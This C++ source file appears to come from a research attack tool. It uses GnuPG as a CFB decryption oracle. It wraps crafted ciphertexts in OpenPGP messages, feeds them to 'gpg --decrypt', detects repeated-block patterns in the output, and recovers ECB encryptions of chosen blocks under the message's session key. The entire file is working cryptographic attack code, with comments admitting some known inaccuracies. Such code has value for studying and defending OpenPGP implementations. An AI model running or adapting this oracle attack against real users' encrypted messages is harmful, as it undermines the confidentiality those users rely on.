

#include "sed-oracle.h"
#include "sedp.h"
#include "except.h"
#include "file_util.h"
#include "subprocess.hpp"
#include <format>
#include <memory>
#include <optional>
#include <botan/auto_rng.h>
#include <iostream>
#include <vector>
#include "util.h"
#include "opgp_cfb_decr_fun_simulation.h"
#include "detect_pattern.h"
#include "except.h"
#include "query_cfb_ct.h"
#include "cipher_block.h"

// Note: boost.process seems badly maintained: https://github.com/bitcoin/bitcoin/issues/24907
//
namespace sp = subprocess;

namespace
{

std::vector<uint8_t> make_pgp_msg(vector_ct_base_t const* query_ct,
                                  std::span<const uint8_t> pkesk,
                                  run_time_ctrl_t* rtc               = nullptr,
                                  std::string const& log_file_prefix = "")
{
    symm_encr_data_packet_t sed      = symm_encr_data_packet_t::create_sedp_from_ciphertext(query_ct->serialize());
    std::vector<uint8_t> encoded_sed = sed.get_encoded();
    std::vector<uint8_t> pgp_msg;
    pgp_msg.assign(pkesk.begin(), pkesk.end());
    pgp_msg.insert(pgp_msg.end(), encoded_sed.begin(), encoded_sed.end());
    if(rtc && log_file_prefix != "")
    {
        rtc->potentially_write_run_time_file(encoded_sed, log_file_prefix + "-encoded-sed");
    }
    return pgp_msg;
}

} // namespace


/**
 * @brief determine the correct ECB oracle block for a single block repetition pattern
 *
 * @param cfb_decryption_result The decryption result returned by the CFB oracle.
 * @param offset_of_rep_in_decr_res The offset at which a block repetition sequence starts within the CFB decryption
 * result.
 * @param query_ct the oracle blocks set in the the ciphertext, i.e. the repeated sequence of blocks responsible
 * for the repetition pattern the plaintext.
 * @param offset_in_ct the offset into the ciphertext at the inital block position of the cfb_decryption_result
 *
 * @return The ECB encrypted oracle block. An empty vector is returned if the recovery failed.
 */
cipher_block_vec_t<AES_BLOCK_SIZE> recover_ecb_encryption_for_arbitrary_length_rep_pattern(
    std::span<const uint8_t> cfb_decryption_result,
    uint32_t offset_of_rep_in_decr_res,
    vector_ct_base_t const* query_ct,
    uint32_t offset_in_ct
    )
{
    size_t rep_pattern_block_count = query_ct->oracle_blocks_single_pattern().size();
    std::cout << std::format("rep_pattern_block_count = {}\n", rep_pattern_block_count);
    std::cout << std::format("offset_of_rep_in_decr_res = {}\n", offset_of_rep_in_decr_res);
    std::cout << std::format("cfb_decryption_result.size() = {}\n", cfb_decryption_result.size());

    if ((cfb_decryption_result.size() < offset_of_rep_in_decr_res) ||
        (cfb_decryption_result.size() - offset_of_rep_in_decr_res) / AES_BLOCK_SIZE < rep_pattern_block_count)
    {
        std::cout << "recover_ecb_encryption_for_arbitrary_length_rep_pattern(): cfb_decryption_result.size() is too "
                     "small, returning empty vector\n";
        return std::vector<cipher_block_t<AES_BLOCK_SIZE>>();
    }

    cipher_block_vec_t<AES_BLOCK_SIZE> cfb_pt_all_blocks(
        std::span(cfb_decryption_result.begin() + offset_of_rep_in_decr_res,
                  cfb_decryption_result.begin() + offset_of_rep_in_decr_res +
                      ((cfb_decryption_result.size() - offset_of_rep_in_decr_res)  / AES_BLOCK_SIZE) * AES_BLOCK_SIZE));

    std::cout << "cfb_pt_all_blocks: " << cfb_pt_all_blocks.hex() << std::endl;

    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encrypted;
    cipher_block_vec_t<AES_BLOCK_SIZE> ct_oracle_blocks_single_pattern_expanded = query_ct->oracle_blocks_single_pattern_expanded();

    std::cout << std::format("ct_oracle_blocks_single_pattern_expanded = {}\n", ct_oracle_blocks_single_pattern_expanded.hex());
    for (size_t i = 0; i < cfb_pt_all_blocks.size(); i++)
    {
        size_t respective_oracle_idx = (i + offset_in_ct) % ct_oracle_blocks_single_pattern_expanded.size();
        auto respective_oracle_block       = ct_oracle_blocks_single_pattern_expanded[respective_oracle_idx];
        cipher_block_t ecb_encrypted_block = cfb_pt_all_blocks[i] ^ respective_oracle_block;
        ecb_encrypted.push_back(ecb_encrypted_block);

    }
    std::cout << std::format("ecb_encrypted = {}\n", ecb_encrypted.hex());

    // improvement: generalize: if decryption result is longer than the pattern, then match the following blocks to the initial
    // blocks

    // exclude the final block from the comparison (should be correct, but isn't (always?) for some reason)
    for (size_t i = ct_oracle_blocks_single_pattern_expanded.size(); i + 1 < cfb_pt_all_blocks.size(); i++)
    {
        size_t ref_i   = i % rep_pattern_block_count;
        auto ref_block = ecb_encrypted[ref_i];
        if (ref_block != ecb_encrypted[i])
        {
            std::cerr << std::format("ref_block[{}] = {}\n", ref_i, ref_block.hex());
            std::cerr << std::format("ecb_encrypted[{}] = {}\n", i, ecb_encrypted[i].hex());

            std::cerr << "error with recovered ECB encryption for repeated blocks\n";
            break;
        }
    }

    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encrypted_single_pattern;
    ecb_encrypted_single_pattern.assign(ecb_encrypted.begin(), ecb_encrypted.begin() + static_cast<long>(rep_pattern_block_count));
    std::cout << std::format("recover_ecb_encryption_for_arbitrary_length_rep_pattern(): ecb_encrypted_single_pattern = {}\n", ecb_encrypted_single_pattern.hex());

    return ecb_encrypted;
}

/**
 * @brief determine the correct ECB oracle block for a single block repetition pattern
 *
 * @param cfb_decryption_result The decryption result returned by the CFB oracle.
 * @param offset_of_rep_in_decr_res The offset at which a block repetition sequence starts within the CFB decryption
 * result.
 * @param query_ct the oracle blocks set in the the ciphertext, i.e. the repeated sequence of blocks responsible
 * for the repetition pattern the plaintext.
 *
 * @return The ECB encrypted oracle block. An optional without value is returned if the recovery failed.
 */
std::optional<cipher_block_t<AES_BLOCK_SIZE>> recover_ecb_encryption_for_single_block_rep_pattern(
    std::span<const uint8_t> cfb_decryption_result,
    uint32_t offset_of_rep_in_decr_res,
    query_cfb_ct_t const& query_ct)
{
    if (query_ct.oracle_blocks_single_pattern().size() != 1)
    {
        throw Exception("case of oracle pattern block count != 1 not implemented");
    }
    cipher_block_vec_t<AES_BLOCK_SIZE> result = recover_ecb_encryption_for_arbitrary_length_rep_pattern(
        cfb_decryption_result, offset_of_rep_in_decr_res, &query_ct);
    if (result.size() > 1)
    {
        result.erase(result.begin() + 1);
    }
    if (result.size() == 0)
    {
        return std::optional<cipher_block_t<AES_BLOCK_SIZE>>();
    }
    return result[0];
}


std::vector<uint8_t> invoke_cfb_opgp_decr(std::span<const uint8_t> oracle_ciphertext,
                                          openpgp_app_decr_params_t const& decr_params)
{

    if (!std::holds_alternative<std::string>(decr_params.ct_filename_or_data))
    {
        throw Exception(std::format("expecting app_param to hold file name, index = {}\n",
                                    decr_params.ct_filename_or_data.index()));
    }
    write_binary_file(std::span(oracle_ciphertext), std::get<std::string>(decr_params.ct_filename_or_data));
    auto result = invoke_cfb_opgp_decr(decr_params);
    return result;
}


std::vector<uint8_t> query_decr_cfb_decr_oracle_with_vector_ct(run_time_ctrl_t rtc,
                                                               vector_ct_base_t const* query_ct,
                                                               openpgp_app_decr_params_t const& decr_params,
                                                               std::span<const uint8_t> pkesk_bytes,
                                                               std::filesystem::path const& msg_file_path,
                                                               std::string const& pgp_msg_log_file_name = "")
{

    std::vector<uint8_t> pgp_msg = make_pgp_msg(query_ct, pkesk_bytes, &rtc, pgp_msg_log_file_name);
    write_binary_file(std::span(pgp_msg), msg_file_path);
    auto decr_params_copy(decr_params);
    decr_params_copy.ct_filename_or_data = msg_file_path;
    if(pgp_msg_log_file_name != "")
    {
        rtc.potentially_write_run_time_file(pgp_msg, pgp_msg_log_file_name);
    }
    return invoke_cfb_opgp_decr(decr_params_copy);
}


std::vector<uint8_t> invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params)
{
    using enum openpgp_app_e;
    if (decr_params.app_type != gnupg)
    {
        throw cli_exception_t("cfb_opgp_decr_oracle(): only GnuPG is currently supported as an oracle");
    }
    std::string app_path = decr_params.application_path;
    if (app_path.size() == 0)
    {
        app_path = "gnupg";
    }
    std::unique_ptr<sp::Popen> p;
    std::vector<char> to_stdin;

    if (std::holds_alternative<std::string>(decr_params.ct_filename_or_data))
    {
        p = std::unique_ptr<sp::Popen>(
            new sp::Popen({app_path, "--batch", "--decrypt", std::get<std::string>(decr_params.ct_filename_or_data)},
                          sp::output {sp::PIPE},
                          sp::error {sp::PIPE},
                          sp::defer_spawn {true}));
    }
    else if (std::holds_alternative<std::vector<uint8_t>>(decr_params.ct_filename_or_data))
    {
        p            = std::unique_ptr<sp::Popen>(new sp::Popen({decr_params.application_path, "--batch", "--decrypt"},
                                                     sp::output {sp::PIPE},
                                                     sp::error {sp::PIPE},
                                                     sp::defer_spawn {true}));
        auto ct_data = std::get<std::vector<uint8_t>>(decr_params.ct_filename_or_data);
        for (size_t i = 0; i < ct_data.size(); i++)
        {
            to_stdin.push_back(static_cast<char>(ct_data[i]));
        }
    }
    else
    {
        throw Exception("internal error: neither file nor data supplied for ciphertext");
    }


    // auto stdout_stderr = p->communicate(to_stdin);
    p->start_process();
    p->send(to_stdin);
    int poll       = p->poll();
    uint32_t count = 0;
    while (poll == -1)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        poll = p->poll();
        if (count++ > 1000)
        {
            break;
        }
    }
    if (poll == -1)
    {
        std::cout << "killing process ...\n"; p->kill();
        return std::vector<uint8_t>();
    }
    auto stdout_stderr = p->communicate();
    auto obuf = stdout_stderr.first;
    std::cout << std::format("invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): obuf.size() = {}\n",
                             obuf.buf.size());
    auto errbuf = stdout_stderr.second;
    std::cout << std::format("invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): errbuf.size() = {}\n",
                             errbuf.buf.size());
    std::vector<uint8_t> result;
    result.insert(result.begin(), obuf.buf.data(), obuf.buf.data() + obuf.length);
    std::cout << std::format(
        "invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): returning result of length {}\n",
        result.size());
    return result;
}

cipher_block_vec_t<AES_BLOCK_SIZE> invoke_ecb_opgp_decr(
    std::string const& pgp_msg_log_file_name,
    run_time_ctrl_t ctl,
    vector_ct_t& vec_ct,
    cipher_block_vec_t<AES_BLOCK_SIZE> const& oracle_ciphertext_blocks,
    std::span<const uint8_t> pkesk,
    openpgp_app_decr_params_t const& decr_params,
    std::span<const uint8_t> session_key,
    std::filesystem::path const& msg_file_path
    )
{
    auto actual_oracle_blocks = oracle_ciphertext_blocks;
    // append a trailing zero block because otherwise the final oracle block will not be recoverable from the CFB
    // decryption result:

    std::vector<uint8_t> cfb_decr_result =
        invoke_cfb_opgp_decr_with_vec_ct(pgp_msg_log_file_name, ctl, vec_ct, actual_oracle_blocks, pkesk, decr_params, msg_file_path);
    std::cout << std::format("raw CFB decryption result with length = {}\n", cfb_decr_result.size());

     
    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_blocks = vec_ct.recover_ecb_from_cfb_decr(cfb_decr_result, session_key);
    std::cout << std::format("invoke_ecb_opgp_decr(): ecb_encr_blocks.size()          = {}\n",ecb_encr_blocks.size());
    std::cout << std::format("invoke_ecb_opgp_decr(): oracle_ciphertext_blocks.size() = {}\n", oracle_ciphertext_blocks.size());
    return ecb_encr_blocks;
}

std::vector<uint8_t> invoke_cfb_opgp_decr_with_vec_ct(
    std::string const& pgp_msg_log_file_name,
    run_time_ctrl_t ctl,
    vector_ct_t& vec_ct,
    cipher_block_vec_t<AES_BLOCK_SIZE> const& oracle_ciphertext_blocks,
    std::span<const uint8_t> pkesk_bytes,
    openpgp_app_decr_params_t const& decr_params,
    std::filesystem::path const& msg_file_path)
{

    if (vec_ct.oracle_blocks_capacity() < oracle_ciphertext_blocks.size())
    {
        throw attack_exception_t("vector ciphertext's oracle block capacity is too small for the payload");
    }
    
    vec_ct.set_oracle_pattern(oracle_ciphertext_blocks);
    std::vector<uint8_t> decryption_result =
        query_decr_cfb_decr_oracle_with_vector_ct(ctl, &vec_ct, decr_params, pkesk_bytes, msg_file_path, pgp_msg_log_file_name );
    return decryption_result;
}


cfb_decr_oracle_result_t cfb_opgp_decr_oracle_initial_query(run_time_ctrl_t rtc,
                                                            uint32_t iter,
                                                            openpgp_app_decr_params_t const& decr_params,
                                                            size_t nb_leading_random_bytes,
                                                            std::span<const uint8_t> pkesk_bytes,
                                                            std::span<const uint8_t> oracle_blocks_single_pattern,
                                                            uint32_t oracle_pattern_repetitions,
                                                            std::filesystem::path const& msg_file_path,
                                                            std::span<const uint8_t> session_key)
{
    if (!std::holds_alternative<std::monostate>(decr_params.ct_filename_or_data))
    {
        throw Exception("ciphertext or filename specified in decryption parameters, this may not be done here");
    }
    lenght_is_multiple_of_aes_block_size_or_throw(oracle_blocks_single_pattern);
    query_cfb_ct_t query_ct = query_cfb_ct_t::create_from_oracle_blocks(
        cipher_block::uint8_span_to_cb_vec<AES_BLOCK_SIZE>(std::span(oracle_blocks_single_pattern)),
        oracle_pattern_repetitions,
        static_cast<uint32_t>(nb_leading_random_bytes));
    std::string pgp_msg_log_file_name = "";
    if (iter == 0)
    {
        pgp_msg_log_file_name = std::format("{}-sample_random_decryption_input-no-positive", iter);
    }
    std::vector<uint8_t> decryption_result = query_decr_cfb_decr_oracle_with_vector_ct(
        rtc, &query_ct, decr_params, pkesk_bytes, msg_file_path, pgp_msg_log_file_name);

    cipher_block_vec_t<AES_BLOCK_SIZE> recovered_blocks;
    uint32_t recovered_offset_into_decryption_result = 0;
    uint32_t recovered_pattern_block_length          = 0;
    if (decryption_result.size() >= 2 * AES_BLOCK_SIZE)
    {
        // check for block repetition pattern in CFB plaintext
        if (detect_pattern::rep_dect_result_t rep_patt = detect_pattern::has_byte_string_repeated_block_at_any_offset(
                decryption_result, query_ct.oracle_single_pattern_block_count()))
        {
            recovered_offset_into_decryption_result = rep_patt.offset();
            recovered_pattern_block_length          = rep_patt.nb_repeated_blocks();
            std::cout << std::format("iteration {}\n", iter);
            std::cout << std::format("  repeated pattern first occurrence at {}\n", rep_patt.offset());
            auto pgp_msg = make_pgp_msg(&query_ct, pkesk_bytes);
            rtc.potentially_write_run_time_file(std::span(pgp_msg) , std::format("random_decryption_input-{}", iter));
            if (session_key.size() > 0)
            {
                auto plaintext =
                    openpgp_cfb_decryption_sim(query_ct.serialize(), std::make_optional(std::span(session_key)));
                rtc.potentially_write_run_time_file(std::span(plaintext),
                                                    std::format("{}-random_decryption_plaintext", iter));
            }
            rtc.potentially_write_run_time_file(decryption_result, std::format("{}-random_decryption_result", iter));


            if (oracle_blocks_single_pattern.size() == AES_BLOCK_SIZE)
            {
                std::optional<cipher_block_t<AES_BLOCK_SIZE>> recov_ecb_encr =
                    recover_ecb_encryption_for_single_block_rep_pattern(
                        decryption_result, rep_patt.offset(), query_ct);
                if (recov_ecb_encr.has_value())
                {
                    std::cout << std::format("  recovered ECB encryption candidate for oracle block {}\n",
                                             Botan::hex_encode(recov_ecb_encr->data(), recov_ecb_encr->size()));

                    if (session_key.size() > 0)
                    {
                        auto actual_ecb_encrypted = ecb_encrypt_block(std::span(session_key), oracle_blocks_single_pattern );
                        if ( actual_ecb_encrypted != recov_ecb_encr.value())
                        {
                            std::cout << std::format("actual_ecb_encrypted         = {}\n", actual_ecb_encrypted.hex());
                            std::cout << std::format("ecb_encrypted_single_pattern = {}\n", recov_ecb_encr.value().hex());
                            std::cerr << "  verification of ECB block encryption for single pattern with actual session key failed\n";
                        }
                        else
                        {
                            std::cout << "  verification of ECB block encryption for single pattern with actual session key succeeded\n";
                        }
                    }


                    recovered_blocks.push_back(recov_ecb_encr.value());
                }
                else
                {
                    std::cout << "  ECB block encryption recovery failed\n";
                }
            }
        }
    }
    vector_ct_t vector_ciphertext = vector_ct_t::create_from_query_cfb_ct(
        &query_ct, recovered_offset_into_decryption_result, recovered_pattern_block_length);
    if (recovered_pattern_block_length > 0)
    {
        std::cout << "  determined vector ciphertext: " << vector_ciphertext.to_string_brief() << std::endl;
    }

    return cfb_decr_oracle_result_t({.decryption_result          = decryption_result,
                                     .recovered_encrypted_blocks = recovered_blocks,
                                     .vector_ciphertext          = vector_ciphertext});
}
